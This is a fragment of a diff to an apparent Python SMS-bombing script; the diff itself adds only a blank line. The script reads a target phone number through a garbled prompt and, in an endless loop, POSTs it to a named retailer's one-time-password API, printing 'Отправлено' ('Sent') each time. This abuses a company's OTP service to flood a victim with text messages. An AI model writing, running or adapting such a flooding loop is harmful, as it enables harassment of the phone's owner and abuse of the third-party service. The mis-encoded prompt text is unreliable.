@@ -6,6 +6,7 @@ NUMBER = input('Beeante HOMep tenedona: (6es +)')
 
  
 while True:
+ 
 try:
      print('Отправлено')
      response = requests.post('https://zolotakoroleva.ua/api/send-otp', headers=headers, data={'phone': "+" + NUMBER})
